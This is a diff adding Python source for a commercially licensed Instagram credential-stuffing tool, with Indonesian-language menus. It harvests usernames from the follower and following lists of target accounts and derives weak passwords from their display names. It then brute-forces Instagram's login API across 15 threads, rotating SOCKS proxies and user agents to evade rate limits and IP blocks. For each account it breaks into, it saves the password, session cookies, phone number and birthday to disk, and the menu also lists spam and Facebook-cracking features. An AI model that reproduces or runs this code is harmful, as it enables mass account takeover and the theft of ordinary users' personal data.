+		self.s.headers.update({'Connection': 'close',
+			'Accept': '*/*',
+			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+			'Cookie2': '$Version=1',
+			'Accept-Language': 'en-US',
+			'User-Agent': user_agentAPI()})
+		self.data = json.dumps({
+			'phone_id': self.generateUUID(True),
+			'_csrftoken': crf_token,
+			'username': self.username,
+			'guid': self.uuid,
+			'device_id': self.device_id,
+			'password': self.password,
+			'login_attempt_count': '0'})
+		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
+			self.generateUUID(False),
+			urllib.request.quote(self.data)
+		)
+		x=self.s.post("https://z-p42.www.instagram.com/api/v1/accounts/login/", self.payload)
+		x_jason=json.loads(x.text)
+		x_kukis=x.cookies.get_dict()
+		if "logged_in_user" in x.text:
+			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
+			#id=x_jason['logged_in_user']['pk']
+			#nm=x_jason['logged_in_user']['full_name']
+			#pn=x_jason['logged_in_user']['phone_number']
+			return {'status':'success','cookie':kuki,'userame':self.username}
+		elif 'challenge_required' in x.text:
+			return {'status':'checkpoint'}
+		else:
+			return {'status':'login_error'}
+C = ''
+
+ip = requests.get("https://api.ipify.org").text
+ng = requests.get("http://ip-api.com/json/").json()["country"]
+try:sh = requests.get('https://httpbin.org/ip').json()
+except:sh = {'origin':'-'}
+_gep = requests.get('http://ipinfo.io/json').json()
+
+class instagram:
+	def __init__(self,external,username,cookie):
+		self.ext=external
+		self.username=username
+		self.cookie=cookie
+		self.s=requests.Session()
+	def logo(self):
+		for i in external:
+			try:
+				nama=i.split('|')[0]
+				followers=i.split('|')[1]
+				following=i.split('|')[2]
+			except:
+				pass
+			banner()
+			prints(Panel(f"{H2}{ng}",title=f"{P2}negara",width=80,padding=(0,33),style=f"{color_table}"))
+			axz.append(Panel(f"""{P2}username  : {H2}{self.username}\n{P2}followers : {H2}{followers}\n{P2}following :{H2} {following}\n{P2}Ip address:{H2} {ip}""",title=f"{P2}data akun",width=38,style=f"{color_table}"))
+			axz.append(Panel(f"""{P2}Info kuota : {H2}{_gep['org']}\n{P2}Zona waktu : {H2}{_gep['timezone']}\n{P2}Kota       : {H2}{_gep['city']}\n{P2}Tanggal    : {H2}{day}""",title=f"{P2}info pengguna",width=39,style=f"{color_table}"))
+			console.print(Columns(axz))
+			prints(Panel(f" {H2}{waktu()}",title=f"{P2}waktu",width=80,padding=(0,30),style=f"{color_table}"))
+			prints(Panel(f"{P2}[{color_rich}01{P2}]. crack dari pencarian nama        {P2}[{color_rich}06{P2}]. lihat akun hasil crack\n{P2}[{color_rich}02{P2}]. crack dari pengikut              {P2}[{color_rich}07{P2}]. bot auto unfollow\n{P2}[{color_rich}03{P2}]. crack dari mengikuti             {P2}[{color_rich}08{P2}]. Crack fb ( {H2}new crack{P2} )\n{P2}[{color_rich}04{P2}]. crack ulang hasil cp             {P2}[{color_rich}09{P2}]. Hapus lisensi  {H2}{P2} \n{P2}[{color_rich}05{P2}]. Bot spam target                  {P2}[{color_rich}00{P2}]. keluar ( {M2}hapus cookie{P2} )",width=80,padding=(0,4),style=f"{color_table}"))
+			prints(Panel(f"{P2}jika ingin mengubah warna tema ketik {color_rich}'ubah' {P2}untuk mengubah warna tema",width=80,padding=(0,3),style=f"{color_table}"))
+
+	def hapus_lisensi(self):
+		ask = input(f" apakah anda yakin ingin menghapus lisensi? Y/t : ")
+		if ask in ["y","Y"]:os.system("rm -rf data/lisensi.txt");prints(Panel(f"{P2}succeed menghapus {color_rich}'lisensi'{P2} terima kasih telah menggunakan script BrayennnXD",width=80,style=f"{color_table}"));time.sleep(2);exit()
+		elif ask in ["t","T"]:self.menu()
+		else:self.hapus_lisensi()
+
+	def Exit(self):
+		x=input(f" apakah anda yakin ingin keluar? Y/t : ")
+		if x in ["y","Y"]:os.system("rm -rf data/.kukis.log rm -rf data/.username");prints(Panel(f"{P2}succeed menghapus {color_rich}'cookie' {P2}terima kasih telah menggunakan script BrayennnXD",width=80,padding=(0,2),style=f"{color_table}"));time.sleep(2);exit()
+		elif x in ["t","T"]:self.menu()
+		else:self.Exit()
+
+	def sixAPI(self,six_id):
+		url = "https://z-p42.www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
+		x = requests.get(url)
+		x_jason = x.json()
+		uid = str( x_jason['users'][0].get("user").get("pk") )
+		return uid
+
+	def unfollowAPI(self,user_id,username_id,cookie):
+		uuid=self.generateUUID(True)
+		xx=self.s.get("https://z-p42.www.instagram.com/",headers={"user-agent":User_Agent()}).content
+		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
+		s.headers.update({'Connection': 'close',
+                       'Accept': '*/*',
+                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                       'Cookie2': '$Version=1',
+                       'Accept-Language': 'en-US',
+                       'User-Agent': User_Agent()})
+
+		data = json.dumps({'_uuid': uuid,
+                           '_uid': username_id,
+                           'user_id': user_id,
+                           '_csrftoken': crf_token})
+
+		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
+			self.generateUUID(False),
+			urllib.request.quote(data))
+		return s.post('https://z-p42.www.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text
+
+
+	def searchAPI(self,cookie,nama):
+		try:
+			x=s.get('https://z-p42.www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
+			x_jason=json.loads(x.text)
+			for i in x_jason['users']:
+				user=i['user']
+				username=user['username']
+				fullname=user['full_name']
+				internal.append(f'{username}|{fullname}')
+		except requests.exceptions.ConnectionError:
+			prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"{color_table}"));time.sleep(3);exit()
+		return internal
+
+	def idAPI(self,cookie,id):
+		if 'sukses' in lisensiku:
+			try:
+				m=s.get("https://z-p42.www.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
+				m_jason=m.json()["data"]["user"]
+				idx=m_jason["id"]
+			except requests.exceptions.ConnectionError:
+				prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"{color_table}"));time.sleep(3);exit()
+			except Exception as e:
+				prints(Panel(f'{P2}username yang anda masukan tidak di temukan atau akun private',width=80,padding=(0,7),style=f"{color_table}"));exit()
+			return idx
+		else:lisensi()
+   
+   	
+	def ingfo(self,cookie):
+		try:
+			link = s.get(f"https://z-p42.www.instagram.com/api/v1/accounts/edit/web_form_data/", headers={"user-agent":user_agentAPI()},cookies={"cookie":cookie}).json()["form_data"]
+			nomor = link["phone_number"].replace("-", "").replace(" ", "")
+			tggl = link["birthday"]
+			year, month, day = tggl.split("-")
+			month = bulan_ttl[month]
+			tanggal = (f"{day} {month} {year}")
+		except:
+			nomor = "-"
+			tanggal = "-"
+		return nomor, tanggal
+
+	
+	def infoAPI(self,cookie,api,id):
+		if 'sukses' in  lisensiku:
+			try:
+				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
+				x_jason=json.loads(x.text)
+				for i in x_jason['users']:
+					username = i["username"]
+					nama = i["full_name"]
+					internal.append(f'{username}|{nama}')
+					following.append(username)
+				if 'pengikut' in menudump:
+					maxid=x_jason['next_max_id']
+					for z in range (9999):
+						x=s.get('https://z-p42.www.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
+						x_jason=json.loads(x.text)
+						try:
+							for i in x_jason['users']:
+								username = i["username"]
+								nama = i["full_name"]
+								internal.append(f'{username}|{nama}')
+								following.append(username)
+							try:
+								maxid=x_jason['next_max_id']
+							except:
+								break
+						except:
+							if 'challenge' in x.text:
+								break
+							else:
+								continue
+				else:pass
+			except requests.exceptions.ConnectionError:
+				prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"{color_table}"));time.sleep(3);exit()
+			except Exception as e:
+				prints(Panel(f'{P2}username yang anda masukan tidak di temukan atau akun private',width=80,padding=(0,7),style=f"{color_table}"));exit()
+			return internal
+		else:lisensi()
+		
+	def ifoAPI(self,cookie,api,id):
+		if 'sukses' in  lisensiku:
+			try:
+				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
+				x_jason=json.loads(x.text)
+				for i in x_jason['users']:
+					username = i["username"]
+					nama = i["full_name"]
+					internal.append(f'{username}|{nama}')
+					following.append(username)
+				if 'mengikuti' in menudump:
+					maxid=x_jason['next_max_id']
+					for z in range (9999):
+						x=s.get('https://z-p42.www.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
+						x_jason=json.loads(x.text)
+						try:
+							for i in x_jason['users']:
+								username = i["username"]
+								nama = i["full_name"]
+								internal.append(f'{username}|{nama}')
+								following.append(username)
+							try:
+								maxid=x_jason['next_max_id']
+							except:
+								break
+						except:
+							if 'challenge' in x.text:
+								break
+							else:
+								continue
+				else:pass
+			except requests.exceptions.ConnectionError:
+				prints(Panel(f'{P2}koneksi internet anda bermasalah silahkan cek dan coba lagi masuk ke tools',width=80,style=f"{color_table}"));time.sleep(3);exit()
+			except Exception as e:
+				prints(Panel(f'{P2}username yang anda masukan tidak di temukan atau akun private',width=80,padding=(0,7),style=f"{color_table}"));exit()
+			return internal
+		else:lisensi()		
+	
+	def useragent(self):
+		self.satu = random.randrange(73, 99)
+		self.dua = random.randrange(4200, 4900)
+		self.tiga = random.randrange(40, 150)
+		useragent = f'''Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/55.0.2883.91 {self.satu}.0.{self.dua}.{self.tiga} Mobile Safari/537.36'''
+		return useragent
+
+	def passwordAPI(self,xnx):
+		prints(Panel(f"{P2}total username terkumpul : {color_rich}{len(internal)}",width=80,padding=(0,20),style=f"{color_table}"))
+		prints(Panel(f"{P2}[{color_rich}1{P2}]. name,name123,name1234\n{P2}[{color_rich}2{P2}]. name,name123,name1234,name12345\n{P2}[{color_rich}3{P2}]. name,name123,name1234,name12345,name123456\n{P2}[{color_rich}4{P2}]. password manual",width=80,padding=(0,14),style=f"{color_table}"))
+		c=input(f' input 1 sampai 4 : ')
+		if c=='1':
+			self.generateAPI(xnx,c)
+		elif c=='2':
+			self.generateAPI(xnx,c)
+		elif c=='3':
+			self.generateAPI(xnx,c)
+		elif c=='4':
+			prints(Panel(f"{P2}masukan password manual minimal password 6 karakter jangan sampe kurang\ncontoh password : sayang,sayang123,indonesia,rahasia,xyaa123",width=80,style=f"{color_table}"))
+			zx=input(f' masukan password : ')
+			self.generateAPI(xnx,c,zx)
+		else:
+			self.passwordAPI(xnx)
+
+	def generateAPI(self,user,o,zx=''):
+		global prog,des
+		xxkontol.append(Panel(f"""   {H2}OK {P2}: {P2}result/{day}.txt""",width=38,style=f"{color_table}"))
+		xxkontol.append(Panel(f"""   {K2}CP {P2}: {P2}result/{day}.txt""",width=39,style=f"{color_table}"))
+		console.print(Columns(xxkontol))
+		prints(Panel(f"{P2}crack di mulai tekan {color_rich}'Ctrl+Z'{P2} di keyboard anda jika ingin berhenti\n\n        {P2}hidupkan mode pesawat 5 detik jika terdeteksi spam ip",width=80,padding=(0,4),style=f"{color_table}"))
+		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
+		des = prog.add_task('',total=len(internal))
+		with prog:
+			with ThreadPoolExecutor(max_workers=15) as shinkai:
+				for i in user:
+					try:
+						username=i.split("|")[0]
+						password=i.split("|")[1].lower()
+						for w in password.split(" "):
+							if len(w)<3:
+								continue
+							else:
+								w=w.lower()
+								if o=="1":
+									if len(w)==3 or len(w)==4 or len(w)==5:
+										sandi=[w,w+'123',w+'1234']
+									else:
+										sandi=[w,w+'123',w+'1234']
+								elif o=="2":
+									if len(w)==3 or len(w)==4 or len(w)==5:
+										sandi=[w,w+'123',w+'1234',w+'12345']
+									else:
+										sandi=[w,w+'123',w+'1234',w+'12345', password.lower()]
+								elif o=="3":
+									if len(w)==3 or len(w)==4 or len(w)==5:
+										sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
+									else:
+										sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
+								elif o=="4":
+									if len(zx) > 3:
+										sandi = zx.replace(" ", "").split(",")
+									else:
+										break
+								shinkai.submit(self.crackAPI,username,sandi)
+					except:pass
+		prints(Panel(f" {P2}crack {color_rich}{len(internal)} {P2}username selesai Hasil Ok : {H2}{len(success)}{P2} Hasil Cp : {K2}{len(checkpoint)}{P2} ",width=80,padding=(0,8),style=f"{color_table}"));time.sleep(4);exit()
+
+	def APIinfo(self,user):
+		try:
+			x=s.get("https://z-p42.www.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":user_agentAPI(),"x-ig-app-id":'936619743392459'})
+			x_jason=x.json()["data"]["user"]
+			nama=x_jason["full_name"]
+			pengikut=x_jason["edge_followed_by"]["count"]
+			mengikut=x_jason["edge_follow"]["count"]
+			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
+		except:
+			pass
+
+		return nama,pengikut,mengikut,postingan
+
+	def crackAPI(self,user,pas):
+		global loop,success,checkpoint
+		ses=requests.Session()
+		ua = random.choice(oppo)
+		prog.update(des,description=f"{H2}stabil{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
+		prog.advance(des)
+		try:
+			for pw in pas:
+				xyaa_code=random.randint(1000000000, 99999999999)
+				ts = calendar.timegm(current_GMT)
+				proxy = {'http': 'socks5://'+random.choice(prox_xyaa)}
+				p = ses.get('https://z-p42.www.instagram.com/accounts/login/')
+				ses.headers.update({
+                    'Host':'z-p42.www.instagram.com',
+                    'X-IG-App-ID':'1217981644879628',
+                    'X-IG-WWW-Claim':'0',
+                    'X-Instagram-AJAX':'e776ba0cb975',
+                    'Content-Type':'application/x-www-form-urlencoded',
+                    'Accept':'*/*',
+                    'X-Requested-With':'XMLHttpRequest',
+                    'X-ASBD-ID':'198387',
+                    'User-Agent':ua,
+                    'X-CSRFToken':p.cookies['csrftoken'],
+                    'Origin':'https://z-p42.www.instagram.com',
+                    'Sec-Fetch-Site':'same-origin',
+                    'Sec-Fetch-Mode':'cors',
+                    'Sec-Fetch-Dest':'empty',
+                    'Referer':'https://z-p42.www.instagram.com/accounts/onetap/',
+                    'Accept-Encoding':'gzip, deflate, br',
+                    'Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})        
+				data = {
+           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
+			"username": user,
+			"queryParams": "{}",
+			"optIntoOneTap": 'false',
+			"stopDeletionNonce": "",
+			"trustedDeviceRecords": "{}"}
+				respon=ses.post("https://z-p42.www.instagram.com/accounts/login/ajax/", data=data, allow_redirects=True)
+				xyaa_code=json.loads(respon.text)
+				if 'userId' in str(xyaa_code):
+					nama,pengikut,mengikut,postingan=self.APIinfo(user)
+					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
+					nomor, tanggal = self.ingfo(cookie)
+					tree = Tree("")
+					tree.add(f"{P2}nama akun : {H2}{nama}").add(f"{H2}{user}|{pw}")
+					tree.add(f"{P2}followers : {H2}{pengikut}")
+					tree.add(f"{P2}following : {H2}{mengikut}")
+					tree.add(f"{P2}nomor hp  : {H2}{nomor}")
+					tree.add(f"{P2}postingan : {H2}{postingan}")
+					tree.add(f"{P2}tanggal lahir : {H2}{tanggal}").add(f"{N2}{cookie}{P2}")
+					prints(tree)
+					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
+					success.append(user)
+					break
+
+				elif 'checkpoint_url' in str(xyaa_code):
+					nama,pengikut,mengikut,postingan=self.APIinfo(user)
+					tree = Tree("")
+					tree.add(f"{P2}nama akun : {K2}{nama}")
+					tree.add(f"{P2}username  : {K2}{user}")
+					tree.add(f"{P2}password  : {K2}{pw}")
+					tree.add(f"{P2}followers : {K2}{pengikut}")
+					tree.add(f"{P2}following : {K2}{mengikut}")
+					tree.add(f"{P2}postingan : {K2}{postingan}\n")
+					prints(tree)
+					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
+					checkpoint.append(user)
+					break
+				elif "Harap tunggu beberapa menit sebelum mencoba lagi." in str(respon.text):
+					prog.update(des,description=f"{M2}spam ip{P2} {loop}/{len(internal)} OK-:{H2}{len(success)} {P2}CP-:{K2}{len(checkpoint)}{P2}")
+					prog.advance(des)
+					time.sleep(15)
+					self.crackAPI(user,pas)
+				elif "ip_block" in str(respon.text):
+					prog.update(des,description=f"{M2}spam ip{P2} {loop}/{len(internal)} OK-:{H2}{len(success)} {P2}CP-:{K2}{len(checkpoint)}{P2}")
+					prog.advance(des)
+					time.sleep(30)
+					self.crackAPI(user,pas)
+				else:
+					continue
+			loop+=1
+		except requests.ConnectionError:
+			time.sleep(10)
+
+	def checkAPI(self,usr,pwd):
+		try:
+			ts = calendar.timegm(current_GMT)
+			ses=requests.Session()
+			proxy = {'http': 'socks5://'+random.choice(prox_xyaa)}
+			ua_xyaaxc = user_agentAPI()
+			token=s.get("https://z-p42.www.instagram.com/accounts/login",headers={"user-agent":self.ua_igeh()}).content
+			crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
+			s.headers.update({
+				'authority': 'www.instagram.com',
+				'connection': 'keep-alive',
+				'sec-ch-ua': '";Not A Brand";v="99", "Chromium";v="94"',
+				'x-ig-app-id': '1217981644879628',
+                'x-ig-www-claim': 'hmac.AR3jlStdcYspw88nLWvVnCDdiZ-KPvru_TasoSJlzGz-iXV2',
+                 'x-requested-with': 'XMLHttpRequest',
+				'sec-ch-ua-mobile': '?1',
+				'x-instagram-ajax': 'c6412f1b1b7b',
+				'content-type': 'application/x-www-form-urlencoded',
+				'accept': '*/*',
+				'x-csrftoken': crf_token,
+				'user-agent': ua_xyaaxc,
+				'x-asbd-id': '198387',
+				'sec-ch-ua-platform': '"Android"',
+				'origin': 'https://www.instagram.com',
+				'sec-fetch-site': 'same-origin',
+				'sec-fetch-mode': 'cors',
+				'sec-fetch-dest': 'empty',
+				'referer': 'https://www.instagram.com/',
+				'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
+			})
+
+			param={
+				"enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pwd}",
+					"username": usr,
+					"optIntoOneTap": False,
+					"queryParams": "{}",
+					"stopDeletionNonce": "",
+					"trustedDeviceRecords": "{}"
+			}
+			x=s.post("https://z-p42.www.instagram.com/accounts/login/ajax/",data=param,proxies=proxy)
+			x_jason=json.loads(x.text)
+			if "userId" in x.text:
+				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
+				print(f"""
+    ├ {CY} LIVE{N}
+	├ {CY}{usr}|{pwd}
+	├ Followers {CY}{pengikut}
+	├ Following {CY}{mengikut}
+	├ Posts
+  	 ∟ jumlah Post {CY}{postingan}""")
+			elif 'checkpoint_url' in x.text:
+				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
+				print(f"""
+    ├ {K}MANGKANYA GANTENG KONTOL{N}
+	├ {K}{usr}|{pwd}
+	├ Followers {K}{pengikut}
+	├ Following {K}{mengikut}
+	├ Posts
+  	 ∟ jumlah Post {K}{postingan}""")
+			elif 'Please wait a few minutes' in str(x.text):
+				sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
+				self.checkAPI(usr,pwd)
+		except:
+			self.checkAPI(usr,pwd)
+
+	def menu(self):
+		self.logo()
+		c=input(f' input 1 sampai 9 : ')
+		if c=='':
+			prints(Panel(f"{P2}pilih yang bener broo jangan kosong !",width=80,padding=(0,19),style=f"{color_table}"));time.sleep(3);exit()
+		elif c in ('1','01'):
+			prints(Panel(f"{P2}maaf tools ini sedang dalam proses maintenance silahkan pilih menu lainnya",width=80,style=f"{color_table}"));sleep(2);exit()
+			mas='[!] Masukan jumlah target'
+			mas1=nel(mas,style='')
+			sol().print(mas1)
+			m=int(input(f'\n{N}[•] Jumlah : {C}'));print('')
+			mas='[•] Masukan nama random untuk di searching'
+			mas1=nel(mas,style='')
+			sol().print(mas1)
+			for i in range(m):
+				i+1
+				nama=input(f'{N} [•] Masukan nama ({H}{len(internal)}{C}): ')
+				name=self.searchAPI(self.cookie,nama)
+			self.passwordAPI(name)
+
+		elif c in ('2','02'):
+			mas=input(f' apakah anda ingin crack masal Y/t : ')
+			if mas in ['y','Y']:
+				masal(self)
+			elif mas in ['t','T']:
+				massal(self)
+			elif mas in ['']:
+				print("Y/t bro jangan kosong")
+
+
+		elif c in ('3','03'):
+			mas=input(f' apakah anda ingin crack masal Y/t : ')
+			if mas in ['y','Y']:
+				mengi(self)
+			elif mas in ['t','T']:
+				meng(self)
+			elif mas in ['']:
+				print("Y/t bro jangan kosong")
+
+
+		elif c in ('4','04'):
+			print('')
+			for i in os.listdir('result'):
+				prints(Panel(f"{P2}hasil crack {i}",width=80,style=f"{color_table}"))
+			c=input(f' masukan nama file : ')
+			g=open("result/%s"%(c)).read().splitlines()
+			print(f' total results : {H}{len(g)}{C}')
+			prints(Panel(f"{P2}proses mengecek status akun. silahkan tunggu sampai proses cek selesai",width=80,style=f"{color_table}"))
+			for s in g:
+				usr=s.split("|")[0]
+				pwd=s.split("|")[1]
+				self.checkAPI(usr,pwd)
+			prints(Panel(f"{P2}proses cek akun selesai, silahkan jalankan ulang scriptnya python run.py",width=80,padding=(0,3),style=f"{color_table}"))
+
+		elif c in ('5','05'):
+			menu_bot()
+			
+		elif c in ('6','06'):
+			global following
+			prints(Panel(f"{P2}maaf tools ini sedang dalam proses maintenance silahkan pilih menu lainnya",width=80,style=f"{color_table}"));sleep(2);exit()
+			six=0
+			print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
+			x=open('data/.kukis.log','r').read()
+			x_id=re.findall('sessionid=(\d+)',x)[0]
+			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
+			for i in following:
+				six+=1
+				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
+				six_id=self.sixAPI(i)
+				print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
+				self.unfollowAPI(six_id,'5452333948',self.cookie)
+				#print(w)
+			input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()
+		elif c in ("ubah","Ubah","UBAH"):
+			change_theme()
+		elif c in ('7','07'):
+			self.hapus_lisensi()
+		elif c in ('0','00'):
+			self.Exit()
+
+		else:
+			self.menu()
+def tlisensi():
+    cetak(nel('[!] Lisensi Tidak Valid\n[!] Silahkan Ketik [green]"Buy"[/green] Untuk membeli lisensi'))
+    time.sleep(2)
+    lisen=input('[•] Masukan Lisensi : ')
+    if lisen in ['']:
+     print(f'{M}[!] JANGAN KOSONG{N}');sleep(1)
+     tlisensi()
+    if lisen in ['buy','Buy']:
+     os.system('xdg-open https://wa.me/6285888222944?text=Bang+beli+lisensi+IG+nya+dong');exit()
+    loadinglisen()
+    open('.lisen.txt','w').write(lisen)
+    lisensi()
+    
+def lisensi():
+ try:
+  cek=open('.lisen.txt').read()
+  lisensikuni.append(cek)
+ except:
+  tlisensi()
+ ses=requests.Session()
+ res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyMzYwMTQxMSIsInA3Qld2ZWY3YTdIYjVseS9wWEJmQmxIKzB4a0gybVlEZm8rSkNUSXkiXQ==&ProductId=16362&Key='+lisensikuni[0]).json()
+ status=res['licenseKey']['key']
+ if status ==cek:
+  cetak(nel('\t[green] SELAMAT LISENSI ANDA VALID[/green]'))
+  time.sleep(2)
+  lisensiku.append("sukses")
+  login_kamu()
+ elif status ==KeyError:
+  os.system('rm .lisen.txt')
+ else:
+  tlisensi()
+
+def mengi(self):
+			try:
+				menudump.append('mengikuti')
+				m=int(input(f' jumlah target : {N}'))
+			except:m=1
+			prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
+			for t in range(m):
+				t +=1
+				nama=input(f' username target : {C}')
+				id=self.idAPI(self.cookie,nama)
+				info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
+			self.passwordAPI(info)
+
+def meng(self):
+	try:
+		menudump.append('mengikuti')
+		prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
+		m=input(f' username target : ')
+		print(f" wait collect username {m}")
+		id=self.idAPI(self.cookie,m)
+		info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
+		self.passwordAPI(info)
+	except Exception as e:
+		print(e)
+
+def masal(self):
+			try:
+				menudump.append('pengikut')
+				m=int(input(f' jumlah target : {N}'))
+			except:m=1
+			prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
+			for t in range(m):
+				t +=1
+				nama=input(f' username target : {C}')
+				id=self.idAPI(self.cookie,nama)
+				info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
+			self.passwordAPI(info)
+
+
+
+def massal(self):
+			menudump.append('pengikut')
+			prints(Panel(f"{P2}pastikan username target yang di pilih bersifat publik dan jangan private",width=80,style=f"{color_table}"))
+			m=input(f' username target : {C}')
+			print(f" wait collect username {m}")
+
+			id=self.idAPI(self.cookie,m)
+			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
+			self.passwordAPI(info)
+
+def key():
+	os.system("clear");banner();key = input(" masukan lisensi : ")
+	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token===&ProductId=16754&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi kamu aktif, tolong gunakan tools ini dengan bijak",width=80,padding=(0,4),style=f"{color_table}"));time.sleep(4);login_kamu()
+	except KeyError:
+		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
+
+def cek():
+	try:x=open("data/lisensi.txt","r").read()
+	except FileNotFoundError:key()
+	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIyNTYzMTUwMyIsIjlJNmI2M3lTcGtackhEaCtyc2JTLzlBZWZLdzZLYTJyZU4rNDNBZk4iXQ==&ProductId=16754&Key=%s"%(x)).json()['licenseKey']['key'];login_kamu()
+	except KeyError:
+		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
+
+def key():
+	os.system("clear") 
+	banner()
+	prints(Panel(f"{P2}silahkan ketik {H2}'beli'{P2} untuk melihat harga lisensi tools",width=80,padding=(0,9),style=f"{color_table}"))
+	key = input(f" masukan lisensi :{H} ")
+	if key in ["beli","Beli","BELI"]:beli_bang()
+	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIyNTYzMTUwMyIsIjlJNmI2M3lTcGtackhEaCtyc2JTLzlBZWZLdzZLYTJyZU4rNDNBZk4iXQ==&ProductId=16754&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi kamu aktif, tolong gunakan tools ini dengan bijak",width=80,padding=(0,4),style=f"{color_table}"));time.sleep(4);login_kamu()
+	except KeyError:
+		prints(Panel(f"{P2} lisensi yang anda masukan tidak terdaftar silahkan beli terlebih dahulu",width=80,padding=(0,1),style=f"{color_table}"));os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
+				
+def cek():
+	try:x=open("data/lisensi.txt","r").read()
+	except FileNotFoundError:key()
+	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIyNTYzMTUwMyIsIjlJNmI2M3lTcGtackhEaCtyc2JTLzlBZWZLdzZLYTJyZU4rNDNBZk4iXQ==&ProductId=16754&Key=%s"%(x)).json()['licenseKey']['key'];login_kamu()
+	except KeyError:
+		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()
+	
+def buy_lisenn():
+	try:xz = open("data/lisensi.txt","r").read()
+	except FileNotFoundError:key()
+	os.system("clear");cek()
+	
+def beli_bang():
